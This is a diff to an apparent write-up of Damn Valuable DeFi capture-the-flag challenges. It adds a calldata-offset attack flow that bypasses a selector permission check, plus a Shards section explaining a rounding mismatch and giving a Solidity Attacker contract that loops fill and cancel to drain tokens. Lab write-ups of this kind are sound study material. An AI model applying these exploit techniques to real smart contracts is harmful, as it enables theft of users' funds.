@@ -1433,6 +1433,22 @@ The core vulnerability lies in the execute() function within the AuthorizedExecu
 
 This implementation is vulnerable due to a fundamental mismatch between permission checking and execution. The code assumes that the actionData always begins at position 100 (4 + 32 * 3), ignoring the fact that in ABI encoding, the actual location is determined by a dynamic offset. There is no validation of actionData integrity, as the code extracts what it thinks is the function selector without verifying it's examining the correct position. Most critically, the code checks permissions based on bytes at a fixed position but executes the entire actionData regardless of what the permission check actually examined, creating a permission check/execution mismatch.
 
+Attack flow:    
+
+1. Craft a malicious calldata payload with the following structure:  
+    - First 4 bytes: Execute function selector  
+    - Next 32 bytes: Target address (the vault) 
+    - Next 32 bytes: Custom offset pointing to where our real actionData begins (0x80/128)  
+    - Next 32 bytes: Empty padding data 
+    - Next 32 bytes: Starting with the permitted function selector (0xd9caed12) at position 100 
+    - Next 32 bytes: Length of the sweepFunds calldata  
+    - Remaining bytes: The actual sweepFunds function call with parameters  
+
+2. When the execute() function processes this payload:  
+    - It checks position 100 and finds the permitted selector (0xd9caed12)  
+    - The permission check passes since this matches an allowed function    
+    - But when executing, it uses the provided offset (0x80) to find the real actionData    
+    - This executes sweepFunds() instead of getLastWithdrawalTimestamp()    
 
 ### Solution
 
@@ -1470,4 +1486,79 @@ This implementation is vulnerable due to a fundamental mismatch between permissi
         );
 
         address(vault).call(calldataPayload);
+    }
+
+
+## 16. Shards
+
+### Challenge overview
+
+The Shards NFT marketplace is a permissionless smart contract enabling holders of Damn Valuable NFTs to sell them at any price (expressed in USDC). 
+These NFTs could be so damn valuable that sellers can offer them in smaller fractions ("shards"). Buyers can buy these shards, represented by an ERC1155 token. The marketplace only pays the seller once the whole NFT is sold.    
+The marketplace charges sellers a 1% fee in Damn Valuable Tokens (DVT). These can be stored in a secure on-chain vault, which in turn integrates with a DVT staking system. 
+Somebody is selling one NFT for... wow, a million USDC? 
+You better dig into that marketplace before the degens find out.    
+You start with no DVTs. Rescue as much funds as you can in a single transaction, and deposit the assets into the designated recovery account.   
+
+### Vulnerability Analysis
+
+The Shards challenge exposes a critical vulnerability in the mathematical calculations used for buying and canceling fractionalized NFTs. Despite implementing an intricate NFT marketplace with fractionalization features, the contract contains a severe rounding discrepancy that allows attackers to extract tokens from the system without any initial capital.
+The core vulnerability lies in the inconsistent rounding methods used between the fill() and cancel() functions within the ShardsNFTMarketplace contract:   
+
+    function fill(uint64 offerId, uint256 want) external returns (uint256 purchaseIndex) {
+        // ... other code ...
+        paymentToken.transferFrom(
+            msg.sender, 
+            address(this), 
+            want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards)
+        );
+        // ... more code ...
+    }
+
+    function cancel(uint64 offerId, uint256 purchaseIndex) external {
+        // ... other code ...
+        paymentToken.transfer(buyer, purchase.shards.mulDivUp(purchase.rate, 1e6));
+    }   
+
+This implementation is vulnerable due to a fundamental inconsistency in numerical precision handling. When buying shards, the contract uses mulDivDown which rounds the result down, potentially to zero for small purchases. Conversely, when canceling purchases, it uses mulDivUp which rounds up, ensuring even microscopic fractional amounts are rounded to at least 1 token. This creates a mathematical arbitrage opportunity.
+
+Attack flow:
+
+1. Purchase a small number of shards (under 134) for effectively 0 tokens due to downward rounding  
+2. Cancel the same purchase and receive a positive number of tokens due to upward rounding  
+3. Repeat this process  
+
+### Solution
+
+    contract Attacker {
+        DamnValuableToken token;
+        ShardsNFTMarketplace marketplace;
+        address recovery;
+
+        constructor(
+            address _token,
+            address _marketplace,
+            address _recovery
+        ) {
+            token = DamnValuableToken(_token);
+            marketplace = ShardsNFTMarketplace(_marketplace);
+            recovery = _recovery;
+        }
+
+        function attack() public {
+            for(uint256 i = 0; i <= 10000; i++) {
+                marketplace.fill(1, 133);
+                marketplace.cancel(1, i);
+            }
+
+            token.transfer(recovery, token.balanceOf(address(this)));
+        }
+    }
+
+    /**
+     * CODE YOUR SOLUTION HERE
+     */
+    function test_shards() public checkSolvedByPlayer {
+        Attacker attacker = new Attacker(address(token), address(marketplace), recovery);
+        attacker.attack();
     }
